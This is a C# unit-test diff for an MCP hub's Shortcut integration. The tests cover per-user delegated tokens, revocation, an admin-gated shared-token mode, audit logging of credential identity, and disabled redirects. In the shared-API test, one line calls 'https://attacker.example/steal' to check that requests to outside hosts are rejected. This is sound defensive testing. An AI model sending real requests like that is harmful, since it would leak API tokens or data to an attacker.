@@ -1,4 +1,5 @@
 using System.Net;
+using System.Security.Claims;
 using System.Text.Json;
 using CodeGraph.Data;
 using CodeGraph.Mcp.Hub;
@@ -32,6 +33,10 @@ public class McpHubServiceTests
         store.Tools.Single(tool => tool.ToolName == "stories-stage-file").DefaultSelected.ShouldBeFalse();
         store.Tools.Single(tool => tool.ToolName == "stories-upload-file").DefaultSelected.ShouldBeFalse();
         store.Tools.Single(tool => tool.ToolName == "documents-get-by-id").ReadOnly.ShouldBeTrue();
+        var sharedTool = store.Tools.Single(tool => tool.ToolName == "shortcut-shared-api");
+        sharedTool.Enabled.ShouldBeFalse();
+        sharedTool.DefaultSelected.ShouldBeFalse();
+        sharedTool.Destructive.ShouldBeTrue();
     }
 
     [Fact]
@@ -435,42 +440,68 @@ public class McpHubServiceTests
     }
 
     [Fact]
-    public async Task SearchShortcutEpicsAsync_FailsClosed_WhenNoSharedCredential()
+    public async Task SharedShortcutTool_RequiresExplicitSelection_EvenForLegacyAllMode()
     {
-        var service = ShortcutService(new EmptyHttpClientFactory());
+        var store = new InMemoryMcpHubStore();
 
-        var noCredential = await Should.ThrowAsync<McpHubProviderPolicyException>(() =>
-            service.SearchShortcutEpicsAsync(null, null, CancellationToken.None));
-        noCredential.Message.ShouldContain("No shared Shortcut API token");
+        (await store.IsTokenEntitledAsync(7, "stories-get-by-id")).ShouldBeTrue();
+        (await store.IsTokenEntitledAsync(7, "shortcut-shared-api")).ShouldBeFalse();
+
+        await store.ReplaceTokenEntitlementsAsync(7, ["shortcut-shared-api"]);
+        (await store.IsTokenEntitledAsync(7, "shortcut-shared-api")).ShouldBeTrue();
     }
 
     [Fact]
-    public async Task SearchShortcutEpicsAsync_UsesSharedNativeCredential()
+    public async Task SearchShortcutEpicsAsync_FailsClosed_WhenDelegatedCredentialIsAbsentOrInvalid()
     {
-        HttpRequestMessage? captured = null;
+        var credentials = new InMemoryMcpProviderCredentialStore();
+        var service = ShortcutService(new EmptyHttpClientFactory(), credentialStore: credentials);
+
+        var noCredential = await Should.ThrowAsync<McpHubProviderPolicyException>(() =>
+            service.SearchShortcutEpicsAsync(null, "alice", CancellationToken.None));
+        noCredential.Message.ShouldContain("No delegated Shortcut credential");
+
+        await credentials.UpsertAsync(DelegatedCredential("alice", "invalid"), "bad-token");
+        var invalid = await Should.ThrowAsync<McpHubProviderPolicyException>(() =>
+            service.SearchShortcutEpicsAsync(null, "alice", CancellationToken.None));
+        invalid.Message.ShouldContain("not valid");
+    }
+
+    [Fact]
+    public async Task ShortcutCalls_UseEachUsersDelegatedCredential_AndRevocationIsImmediate()
+    {
+        var capturedTokens = new List<string>();
         var factory = new StubHttpClientFactory(
             new Uri("https://api.app.shortcut.com/api/v3/"),
             request =>
             {
-                captured = request;
+                capturedTokens.Add(request.Headers.GetValues("Shortcut-Token").Single());
                 return new HttpResponseMessage(HttpStatusCode.OK) { Content = new StringContent("""{"data":[]}""") };
             });
         var hubStore = new RecordingMcpHubStore
         {
             Providers = [new() { ProviderKey = "shortcut", Enabled = true }]
         };
+        // A configured shared token must never be used as an implicit fallback.
         hubStore.Credentials[("shortcut", "apiToken")] = "shared-token";
-        var service = ShortcutService(factory, hubStore);
+        var credentials = new InMemoryMcpProviderCredentialStore();
+        await credentials.UpsertAsync(DelegatedCredential("alice", "valid", "Alice Shortcut"), "alice-token");
+        await credentials.UpsertAsync(DelegatedCredential("bob", "valid", "Bob Shortcut"), "bob-token");
+        var service = ShortcutService(factory, hubStore, credentials);
 
-        await service.SearchShortcutEpicsAsync("owner:me", null, CancellationToken.None);
+        await service.SearchShortcutEpicsAsync("owner:me", "  ALICE  ", CancellationToken.None);
+        await service.SearchShortcutEpicsAsync("owner:me", "bob", CancellationToken.None);
+        capturedTokens.ShouldBe(["alice-token", "bob-token"]);
 
-        captured.ShouldNotBeNull();
-        captured.Headers.GetValues("Shortcut-Token").Single().ShouldBe("shared-token");
-        captured.RequestUri!.ToString().ShouldBe("https://api.app.shortcut.com/api/v3/search/epics?query=owner%3Ame");
+        (await credentials.DeleteAsync("shortcut", "alice", "apiToken")).ShouldBeTrue();
+        var revoked = await Should.ThrowAsync<McpHubProviderPolicyException>(() =>
+            service.SearchShortcutEpicsAsync(null, "alice", CancellationToken.None));
+        revoked.Message.ShouldContain("No delegated Shortcut credential");
+        capturedTokens.ShouldBe(["alice-token", "bob-token"]);
     }
 
     [Fact]
-    public async Task InvokeShortcutApiAsync_FallsBackToLegacyShimDiscoveryToken()
+    public async Task SharedShortcutApi_RequiresAdminConfig_AndUsesSeparateSharedCredential()
     {
         HttpRequestMessage? captured = null;
         string? capturedBody = null;
@@ -486,23 +517,30 @@ public class McpHubServiceTests
         {
             Providers = [new() { ProviderKey = "shortcut", Enabled = true }]
         };
-        hubStore.Credentials[("shortcut-shim", "discoveryToken")] = "legacy-shim-token";
+        hubStore.Credentials[("shortcut", "apiToken")] = "shared-token";
         var service = ShortcutService(factory, hubStore);
 
-        var result = await service.InvokeShortcutApiAsync(
-            null,
-            HttpMethod.Put,
+        var disabled = await Should.ThrowAsync<McpHubProviderPolicyException>(() =>
+            service.InvokeSharedShortcutApiAsync("PUT", "stories/123", """{"name":"Updated"}"""));
+        disabled.Message.ShouldContain("disabled");
+
+        hubStore.Config[("shortcut", McpHubService.SharedShortcutModeConfigKey)] = "true";
+        var result = await service.InvokeSharedShortcutApiAsync(
+            "PUT",
             "stories/123",
             """{"name":"Updated"}""",
-            McpHubService.BuildQuery(("query", "owner:me"), ("empty", "")),
+            """{"query":"owner:me","empty":""}""",
             CancellationToken.None);
 
         result.ShouldBe("""{"ok":true}""");
         captured.ShouldNotBeNull();
         captured.Method.ShouldBe(HttpMethod.Put);
         captured.RequestUri!.ToString().ShouldBe("https://api.app.shortcut.com/api/v3/stories/123?query=owner%3Ame");
-        captured.Headers.GetValues("Shortcut-Token").Single().ShouldBe("legacy-shim-token");
+        captured.Headers.GetValues("Shortcut-Token").Single().ShouldBe("shared-token");
         capturedBody.ShouldBe("""{"name":"Updated"}""");
+
+        await Should.ThrowAsync<McpHubProviderPolicyException>(() =>
+            service.InvokeSharedShortcutApiAsync("GET", "https://attacker.example/steal"));
     }
 
     [Fact]
@@ -536,9 +574,18 @@ public class McpHubServiceTests
         (await service.ValidateShortcutCredentialAsync("  ")).IsValid.ShouldBeFalse();
     }
 
+    [Fact]
+    public void ShortcutHttpHandler_DisablesAutomaticRedirects()
+    {
+        using var handler = McpHubServiceCollectionExtensions.CreateShortcutPrimaryHandler();
+
+        handler.AllowAutoRedirect.ShouldBeFalse();
+    }
+
     private static McpHubService ShortcutService(
         IHttpClientFactory httpClientFactory,
-        RecordingMcpHubStore? hubStore = null)
+        RecordingMcpHubStore? hubStore = null,
+        IMcpProviderCredentialStore? credentialStore = null)
     {
         hubStore ??= new RecordingMcpHubStore
         {
@@ -550,8 +597,23 @@ public class McpHubServiceTests
             httpClientFactory,
             Policy(new InMemoryMcpSensitiveColumnStore()),
             ExposurePolicy(),
-            NullLogger<McpHubService>.Instance);
+            NullLogger<McpHubService>.Instance,
+            shortcutUploadStaging: null,
+            credentialStore);
     }
+
+    private static McpProviderCredentialEntity DelegatedCredential(
+        string username,
+        string validationState,
+        string? providerIdentity = null) => new()
+    {
+        ProviderKey = "shortcut",
+        Username = username,
+        CredentialKey = McpHubService.ShortcutCredentialKey,
+        ValidationState = validationState,
+        ProviderIdentity = providerIdentity,
+        LastValidatedAtUtc = validationState == "valid" ? DateTime.UtcNow : null,
+    };
 
     [Fact]
     public async Task McpHubServer_AuditsPolicyDenial_WhenProviderCallIsBlockedByPolicy()
@@ -593,6 +655,330 @@ public class McpHubServiceTests
     }
 
     [Fact]
+    public async Task McpHubServer_AuditsDelegatedModeAndProviderIdentity()
+    {
+        var store = new RecordingMcpHubStore
+        {
+            Providers = [new() { ProviderKey = "shortcut", Enabled = true }]
+        };
+        var credentials = new InMemoryMcpProviderCredentialStore();
+        await credentials.UpsertAsync(
+            DelegatedCredential("alice", "valid", "Alice Shortcut (@alice)"),
+            "alice-token");
+        var factory = new StubHttpClientFactory(
+            new Uri("https://api.app.shortcut.com/api/v3/"),
+            _ => new HttpResponseMessage(HttpStatusCode.OK)
+            {
+                Content = new StringContent("""{"data":[]}""")
+            });
+        var context = new DefaultHttpContext
+        {
+            User = new ClaimsPrincipal(new ClaimsIdentity(
+            [
+                new Claim("preferred_username", "Alice"),
+                new Claim("mcp_pat_token_id", "7"),
+            ], "test"))
+        };
+        var hub = new McpHubService(
+            store,
+            new EmptyProjectQueryService(),
+            factory,
+            Policy(new InMemoryMcpSensitiveColumnStore()),
+            ExposurePolicy(),
+            NullLogger<McpHubService>.Instance,
+            shortcutUploadStaging: null,
+            credentials);
+        var server = new McpHubServer(hub, new HttpContextAccessor { HttpContext = context });
+
+        await server.SearchShortcutEpics("owner:me", CancellationToken.None);
+
+        var audit = store.Audit.ShouldHaveSingleItem();
+        audit.Username.ShouldBe("alice");
+        audit.TokenId.ShouldBe(7);
+        audit.CredentialMode.ShouldBe("delegated");
+        audit.ProviderIdentity.ShouldBe("Alice Shortcut (@alice)");
+        audit.Success.ShouldBeTrue();
+    }
+
+    [Theory]
+    [InlineData(HttpStatusCode.Unauthorized)]
+    [InlineData(HttpStatusCode.Forbidden)]
+    [InlineData(HttpStatusCode.TooManyRequests)]
+    [InlineData(HttpStatusCode.InternalServerError)]
+    public async Task McpHubServer_AuditsAndRethrowsShortcutNonSuccessResponsesAsProviderFailures(
+        HttpStatusCode statusCode)
+    {
+        var store = new RecordingMcpHubStore
+        {
+            Providers = [new() { ProviderKey = "shortcut", Enabled = true }]
+        };
+        var credentials = new InMemoryMcpProviderCredentialStore();
+        await credentials.UpsertAsync(
+            DelegatedCredential("alice", "valid", "Alice Shortcut (@alice)"),
+            "alice-token");
+        var factory = new StubHttpClientFactory(
+            new Uri("https://api.app.shortcut.com/api/v3/"),
+            _ => new HttpResponseMessage(statusCode)
+            {
+                Content = new StringContent("provider rejected the request")
+            });
+        var server = new McpHubServer(
+            ShortcutService(factory, store, credentials),
+            new HttpContextAccessor { HttpContext = ShortcutContext("Alice", 7) });
+
+        var error = await Should.ThrowAsync<ShortcutProviderException>(() =>
+            server.SearchShortcutEpics("owner:me", CancellationToken.None));
+
+        error.StatusCode.ShouldBe(statusCode);
+        var audit = store.Audit.ShouldHaveSingleItem();
+        audit.Success.ShouldBeFalse();
+        audit.StatusClass.ShouldBe("provider_error");
+        audit.AuthorizationDecision.ShouldBe("allowed");
+        audit.CredentialMode.ShouldBe("delegated");
+        audit.ProviderIdentity.ShouldBe("Alice Shortcut (@alice)");
+    }
+
+    [Fact]
+    public async Task McpHubServer_UsesOneAtomicCredentialSnapshotForTokenAndAuditIdentity()
+    {
+        string? capturedToken = null;
+        var store = new RecordingMcpHubStore
+        {
+            Providers = [new() { ProviderKey = "shortcut", Enabled = true }]
+        };
+        var credentials = new TornCredentialStore();
+        var factory = new StubHttpClientFactory(
+            new Uri("https://api.app.shortcut.com/api/v3/"),
+            request =>
+            {
+                capturedToken = request.Headers.GetValues("Shortcut-Token").Single();
+                return new HttpResponseMessage(HttpStatusCode.OK)
+                {
+                    Content = new StringContent("""{"data":[]}""")
+                };
+            });
+        var server = new McpHubServer(
+            ShortcutService(factory, store, credentials),
+            new HttpContextAccessor { HttpContext = ShortcutContext("Alice", 7) });
+
+        await server.SearchShortcutEpics("owner:me", CancellationToken.None);
+
+        capturedToken.ShouldBe("new-token");
+        credentials.SnapshotReads.ShouldBe(1);
+        credentials.MetadataReads.ShouldBe(0);
+        credentials.SecretReads.ShouldBe(0);
+        store.Audit.ShouldHaveSingleItem().ProviderIdentity.ShouldBe("New Shortcut Identity");
+    }
+
+    [Fact]
+    public async Task McpHubServer_PersistsCancellationAuditWithIndependentToken_AndRethrows()
+    {
+        var store = new RecordingMcpHubStore
+        {
+            Providers = [new() { ProviderKey = "shortcut", Enabled = true }]
+        };
+        var credentials = new InMemoryMcpProviderCredentialStore();
+        await credentials.UpsertAsync(
+            DelegatedCredential("alice", "valid", "Alice Shortcut (@alice)"),
+            "alice-token");
+        var factory = new AsyncStubHttpClientFactory(
+            new Uri("https://api.app.shortcut.com/api/v3/"),
+            (_, ct) => Task.FromCanceled<HttpResponseMessage>(ct));
+        var server = new McpHubServer(
+            ShortcutService(factory, store, credentials),
+            new HttpContextAccessor { HttpContext = ShortcutContext("Alice", 7) });
+        using var cts = new CancellationTokenSource();
+        cts.Cancel();
+
+        await Should.ThrowAsync<OperationCanceledException>(() =>
+            server.SearchShortcutEpics("owner:me", cts.Token));
+
+        var audit = store.Audit.ShouldHaveSingleItem();
+        audit.Success.ShouldBeFalse();
+        audit.StatusClass.ShouldBe("cancelled");
+        store.LastAuditTokenWasCancellationRequested.ShouldBe(false);
+    }
+
+    [Fact]
+    public async Task McpHubServer_AuditsAndRethrowsProviderTimeoutAsProviderError()
+    {
+        var store = new RecordingMcpHubStore
+        {
+            Providers = [new() { ProviderKey = "shortcut", Enabled = true }]
+        };
+        var credentials = new InMemoryMcpProviderCredentialStore();
+        await credentials.UpsertAsync(
+            DelegatedCredential("alice", "valid", "Alice Shortcut (@alice)"),
+            "alice-token");
+        var factory = new AsyncStubHttpClientFactory(
+            new Uri("https://api.app.shortcut.com/api/v3/"),
+            (_, _) => Task.FromException<HttpResponseMessage>(new TaskCanceledException("provider timeout")));
+        var server = new McpHubServer(
+            ShortcutService(factory, store, credentials),
+            new HttpContextAccessor { HttpContext = ShortcutContext("Alice", 7) });
+
+        await Should.ThrowAsync<TaskCanceledException>(() =>
+            server.SearchShortcutEpics("owner:me", CancellationToken.None));
+        var audit = store.Audit.ShouldHaveSingleItem();
+        audit.Success.ShouldBeFalse();
+        audit.StatusClass.ShouldBe("provider_error");
+        store.LastAuditTokenWasCancellationRequested.ShouldBe(false);
+    }
+
+    [Fact]
+    public async Task ExplicitlyEntitledPat_RunsExistingShortcutToolsInSharedMode()
+    {
+        string? capturedToken = null;
+        var store = new RecordingMcpHubStore
+        {
+            Providers = [new() { ProviderKey = "shortcut", Enabled = true }]
+        };
+        store.Config[("shortcut", McpHubService.SharedShortcutModeConfigKey)] = "true";
+        store.Credentials[("shortcut", McpHubService.ShortcutCredentialKey)] = "shared-token";
+        store.Entitlements.Add((7, "shortcut-shared-api"));
+        var factory = new StubHttpClientFactory(
+            new Uri("https://api.app.shortcut.com/api/v3/"),
+            request =>
+            {
+                capturedToken = request.Headers.GetValues("Shortcut-Token").Single();
+                return new HttpResponseMessage(HttpStatusCode.OK)
+                {
+                    Content = new StringContent("""{"data":[]}""")
+                };
+            });
+        var context = new DefaultHttpContext
+        {
+            User = new ClaimsPrincipal(new ClaimsIdentity(
+            [
+                new Claim("preferred_username", "Alice"),
+                new Claim("mcp_pat_token_id", "7"),
+            ], "test"))
+        };
+        var hub = ShortcutService(factory, store, new InMemoryMcpProviderCredentialStore());
+        var server = new McpHubServer(hub, new HttpContextAccessor { HttpContext = context });
+
+        await server.SearchShortcutEpics("owner:me", CancellationToken.None);
+
+        capturedToken.ShouldBe("shared-token");
+        var audit = store.Audit.ShouldHaveSingleItem();
+        audit.CredentialMode.ShouldBe("shared");
+        audit.ProviderIdentity.ShouldBeNull();
+        audit.Success.ShouldBeTrue();
+    }
+
+    [Fact]
+    public async Task NamedShortcutCall_AuditsTheExactCredentialUsed_WhenEntitlementChangesAfterResolution()
+    {
+        string? capturedToken = null;
+        var entitlementChecks = 0;
+        var store = new RecordingMcpHubStore
+        {
+            Providers = [new() { ProviderKey = "shortcut", Enabled = true }],
+            EntitlementResolver = (_, toolName) =>
+            {
+                if (!string.Equals(toolName, "shortcut-shared-api", StringComparison.OrdinalIgnoreCase))
+                    return false;
+                entitlementChecks++;
+                return entitlementChecks > 1;
+            }
+        };
+        store.Config[("shortcut", McpHubService.SharedShortcutModeConfigKey)] = "true";
+        store.Credentials[("shortcut", McpHubService.ShortcutCredentialKey)] = "shared-token";
+        var credentials = new InMemoryMcpProviderCredentialStore();
+        await credentials.UpsertAsync(
+            DelegatedCredential("alice", "valid", "Alice Shortcut (@alice)"),
+            "alice-token");
+        var factory = new StubHttpClientFactory(
+            new Uri("https://api.app.shortcut.com/api/v3/"),
+            request =>
+            {
+                capturedToken = request.Headers.GetValues("Shortcut-Token").Single();
+                return new HttpResponseMessage(HttpStatusCode.OK)
+                {
+                    Content = new StringContent("""{"data":[]}""")
+                };
+            });
+        var context = ShortcutContext("Alice", 7);
+        var hub = ShortcutService(factory, store, credentials);
+        var server = new McpHubServer(hub, new HttpContextAccessor { HttpContext = context });
+
+        await server.SearchShortcutEpics("owner:me", CancellationToken.None);
+
+        entitlementChecks.ShouldBe(1);
+        capturedToken.ShouldBe("alice-token");
+        var audit = store.Audit.ShouldHaveSingleItem();
+        audit.CredentialMode.ShouldBe("delegated");
+        audit.ProviderIdentity.ShouldBe("Alice Shortcut (@alice)");
+    }
+
+    [Fact]
+    public async Task ShortcutUpload_AuditsTheExactCredentialUsed_WhenEntitlementChangesAfterResolution()
+    {
+        string? capturedToken = null;
+        var entitlementChecks = 0;
+        var store = new RecordingMcpHubStore
+        {
+            Providers = [new() { ProviderKey = "shortcut", Enabled = true }],
+            EntitlementResolver = (_, toolName) =>
+            {
+                if (!string.Equals(toolName, "shortcut-shared-api", StringComparison.OrdinalIgnoreCase))
+                    return false;
+                entitlementChecks++;
+                return entitlementChecks > 1;
+            }
+        };
+        store.Config[("shortcut", McpHubService.SharedShortcutModeConfigKey)] = "true";
+        store.Credentials[("shortcut", McpHubService.ShortcutCredentialKey)] = "shared-token";
+        var credentials = new InMemoryMcpProviderCredentialStore();
+        await credentials.UpsertAsync(
+            DelegatedCredential("alice", "valid", "Alice Shortcut (@alice)"),
+            "alice-token");
+        var factory = new StubHttpClientFactory(
+            new Uri("https://api.app.shortcut.com/api/v3/"),
+            request =>
+            {
+                capturedToken = request.Headers.GetValues("Shortcut-Token").Single();
+                return new HttpResponseMessage(HttpStatusCode.OK)
+                {
+                    Content = new StringContent("""[{"id":1}]""")
+                };
+            });
+        var context = ShortcutContext("Alice", 7);
+        using var staging = new ShortcutUploadStagingArea();
+        var hub = new McpHubService(
+            store,
+            new EmptyProjectQueryService(),
+            factory,
+            Policy(new InMemoryMcpSensitiveColumnStore()),
+            ExposurePolicy(),
+            NullLogger<McpHubService>.Instance,
+            staging,
+            credentials);
+        var server = new McpHubServer(hub, new HttpContextAccessor { HttpContext = context });
+        var staged = await hub.StageShortcutFileAsync(
+            "Alice", 7, "upload.txt", Convert.ToBase64String("upload"u8.ToArray()));
+        using var stagedJson = JsonDocument.Parse(staged);
+        var handle = stagedJson.RootElement.GetProperty("handle").GetString()!;
+
+        await server.UploadShortcutStoryFile(17955, handle, CancellationToken.None);
+
+        entitlementChecks.ShouldBe(1);
+        capturedToken.ShouldBe("alice-token");
+        var audit = store.Audit.ShouldHaveSingleItem();
+        audit.CredentialMode.ShouldBe("delegated");
+        audit.ProviderIdentity.ShouldBe("Alice Shortcut (@alice)");
+    }
+
+    private static DefaultHttpContext ShortcutContext(string username, long tokenId) => new()
+    {
+        User = new ClaimsPrincipal(new ClaimsIdentity(
+        [
+            new Claim("preferred_username", username),
+            new Claim("mcp_pat_token_id", tokenId.ToString()),
+        ], "test"))
+    };
+
+    [Fact]
     public async Task McpHubService_AuditAsync_NormalizesAndPersistsTheEnvelope()
     {
         var store = new RecordingMcpHubStore();
@@ -612,6 +998,7 @@ public class McpHubServiceTests
         audit.Username.ShouldBe("alice");
         audit.TokenId.ShouldBe(7);
         audit.CredentialMode.ShouldBe("shared");
+        audit.ProviderIdentity.ShouldBeNull();
         audit.AuthorizationDecision.ShouldBe("allowed");
         audit.StatusClass.ShouldBe("ok");
         audit.Success.ShouldBeTrue();
@@ -672,6 +1059,83 @@ public class McpHubServiceTests
         }
     }
 
+    private sealed class AsyncStubHttpClientFactory(
+        Uri baseAddress,
+        Func<HttpRequestMessage, CancellationToken, Task<HttpResponseMessage>> responder)
+        : IHttpClientFactory
+    {
+        public HttpClient CreateClient(string name) =>
+            new(new StubHandler(responder)) { BaseAddress = baseAddress };
+
+        private sealed class StubHandler(
+            Func<HttpRequestMessage, CancellationToken, Task<HttpResponseMessage>> responder)
+            : HttpMessageHandler
+        {
+            protected override Task<HttpResponseMessage> SendAsync(
+                HttpRequestMessage request,
+                CancellationToken cancellationToken) =>
+                responder(request, cancellationToken);
+        }
+    }
+
+    private sealed class TornCredentialStore : IMcpProviderCredentialStore
+    {
+        public int SnapshotReads { get; private set; }
+        public int MetadataReads { get; private set; }
+        public int SecretReads { get; private set; }
+
+        public Task<McpProviderCredentialSnapshot?> GetSnapshotAsync(
+            string providerKey,
+            string username,
+            string credentialKey,
+            CancellationToken ct = default)
+        {
+            SnapshotReads++;
+            return Task.FromResult<McpProviderCredentialSnapshot?>(new(
+                "valid",
+                "New Shortcut Identity",
+                null,
+                "new-token"));
+        }
+
+        public Task<McpProviderCredentialEntity?> GetAsync(
+            string providerKey,
+            string username,
+            string credentialKey,
+            CancellationToken ct = default)
+        {
+            MetadataReads++;
+            return Task.FromResult<McpProviderCredentialEntity?>(
+                DelegatedCredential(username, "valid", "Old Shortcut Identity"));
+        }
+
+        public Task<string?> GetValueAsync(
+            string providerKey,
+            string username,
+            string credentialKey,
+            CancellationToken ct = default)
+        {
+            SecretReads++;
+            return Task.FromResult<string?>("new-token");
+        }
+
+        public Task<IReadOnlyList<McpProviderCredentialEntity>> ListForUserAsync(
+            string username,
+            CancellationToken ct = default) =>
+            Task.FromResult<IReadOnlyList<McpProviderCredentialEntity>>([]);
+
+        public Task UpsertAsync(
+            McpProviderCredentialEntity entity,
+            string? plaintextValue,
+            CancellationToken ct = default) => Task.CompletedTask;
+
+        public Task<bool> DeleteAsync(
+            string providerKey,
+            string username,
+            string credentialKey,
+            CancellationToken ct = default) => Task.FromResult(false);
+    }
+
     private sealed class CountingSensitiveColumnStore(params McpSensitiveColumnEntity[] seed) : IMcpSensitiveColumnStore
     {
         private readonly List<McpSensitiveColumnEntity> rows = seed.ToList();
@@ -703,7 +1167,10 @@ public class McpHubServiceTests
         public List<McpHubToolEntity> Tools { get; } = [];
         public Dictionary<(string Provider, string Key), string?> Config { get; } = [];
         public Dictionary<(string Provider, string Key), string?> Credentials { get; } = [];
+        public HashSet<(long TokenId, string ToolName)> Entitlements { get; } = [];
+        public Func<long, string, bool>? EntitlementResolver { get; init; }
         public List<McpHubAuditEntity> Audit { get; } = [];
+        public bool? LastAuditTokenWasCancellationRequested { get; private set; }
 
         public Task<IReadOnlyList<McpHubProviderEntity>> ListProvidersAsync(CancellationToken ct = default) =>
             Task.FromResult<IReadOnlyList<McpHubProviderEntity>>(Providers);
@@ -739,10 +1206,14 @@ public class McpHubServiceTests
         public Task SetConfigValueAsync(string providerKey, string configKey, string? value, string? updatedBy, CancellationToken ct = default) => throw new NotSupportedException();
         public Task ReplaceTokenEntitlementsAsync(long tokenId, IReadOnlyCollection<string> toolNames, CancellationToken ct = default) => throw new NotSupportedException();
         public Task<IReadOnlyList<string>> GetTokenEntitlementsAsync(long tokenId, CancellationToken ct = default) => throw new NotSupportedException();
-        public Task<bool> IsTokenEntitledAsync(long tokenId, string toolName, CancellationToken ct = default) => throw new NotSupportedException();
+        public Task<bool> IsTokenEntitledAsync(long tokenId, string toolName, CancellationToken ct = default) =>
+            Task.FromResult(
+                EntitlementResolver?.Invoke(tokenId, toolName)
+                ?? Entitlements.Contains((tokenId, toolName)));
 
         public Task CreateAuditAsync(McpHubAuditEntity audit, CancellationToken ct = default)
         {
+            LastAuditTokenWasCancellationRequested = ct.IsCancellationRequested;
             Audit.Add(audit);
             return Task.CompletedTask;
         }
